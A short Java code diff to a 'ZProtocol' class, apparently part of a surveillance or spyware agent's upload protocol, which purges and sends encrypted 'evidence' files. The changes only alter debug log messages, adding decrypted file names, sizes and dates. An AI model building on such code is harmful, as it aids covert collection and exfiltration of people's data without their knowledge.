@@ -795,13 +795,13 @@ public class ZProtocol extends Protocol {
                 if (file.exists()) {
                     if (size > 0 && file.getSize() > size) {
                         //#ifdef DEBUG
-                        debug.info("purgeEvidences, removing due size: " + logName);
+                        debug.info("purgeEvidences, removing due size: " + EvidenceCollector.decryptName(logName));
                         //#endif
                         file.delete();
                     } else if (date != null
                             && file.lastModified() < date.getTime()) {
                         //#ifdef DEBUG
-                        debug.info("purgeEvidences, removing due date: " + logName);
+                        debug.info("purgeEvidences, removing due date: " + EvidenceCollector.decryptName(logName));
                         //#endif
                         file.delete();
                     }
@@ -856,8 +856,7 @@ public class ZProtocol extends Protocol {
                 final byte[] content = file.read();
                 //#ifdef DEBUG
                 debug.info("Sending file: " //$NON-NLS-1$
-                        + EvidenceCollector.decryptName(logName) + " = " //$NON-NLS-1$
-                        + fullLogName);
+                        + EvidenceCollector.decryptName(logName) + " size: " + file.getSize() + " date: " + file.getFileTime());
                 //#endif
 
                 plainOut = new byte[content.length + 4];
